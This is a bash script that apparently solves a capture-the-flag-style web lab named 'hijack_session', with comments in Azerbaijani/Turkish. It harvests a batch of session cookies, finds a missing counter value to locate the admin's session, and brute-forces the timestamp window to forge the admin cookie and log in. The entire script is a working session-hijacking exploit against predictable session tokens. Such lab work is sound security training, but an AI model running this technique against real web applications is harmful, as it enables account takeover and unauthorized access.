#!/bin/bash
URL="http://web0x01.hbtn"
PAGE="/a1/hijack_session/"
LOGIN="/api/a1/hijack_session/login"

echo "[*] Session-lar toplanır..."

sessions=()

for i in {1..15}; do
  s=$(curl -s -D - "$URL$PAGE" \
    | grep -i "^Set-Cookie: hijack_session=" \
    | cut -d= -f2 \
    | cut -d\; -f1)

  echo "[$i] $s"
  sessions+=("$s")
  sleep 0.3
done

echo
echo "[*] Counter GAP axtarılır..."

prev_counter=0

for s in "${sessions[@]}"; do
  counter=$(echo "$s" | cut -d- -f5)

  if [[ "$prev_counter" -ne 0 && $((prev_counter+1)) -ne "$counter" ]]; then
    ADMIN_COUNTER=$((prev_counter+1))
    echo "[+] GAP tapıldı → Admin counter: $ADMIN_COUNTER"
    break
  fi

  prev_counter=$counter
done

if [[ -z "$ADMIN_COUNTER" ]]; then
  echo "[-] GAP tapılmadı"
  exit 1
fi

PREFIX=$(echo "${sessions[0]}" | cut -d- -f1-4)
TS1=$(echo "${sessions[-2]}" | cut -d- -f6)
TS2=$(echo "${sessions[-1]}" | cut -d- -f6)

START=$((TS1+1))
END=$((TS2-1))

echo "[*] Timestamp aralığı: $START → $END"
echo
echo "[*] Brute-force başlayır..."

for ts in $(seq $START $END); do
  COOKIE="$PREFIX-$ADMIN_COUNTER-$ts"

  res=$(curl -s -X POST \
    -b "hijack_session=$COOKIE" \
    "$URL$LOGIN")

  if [[ "$res" != *"failed"* ]]; then
    echo
    echo "[🎯 UĞUR TAPILDI]"
    echo "$res"
    exit 0
  fi
done

echo "[-] Flag tapılmadı"
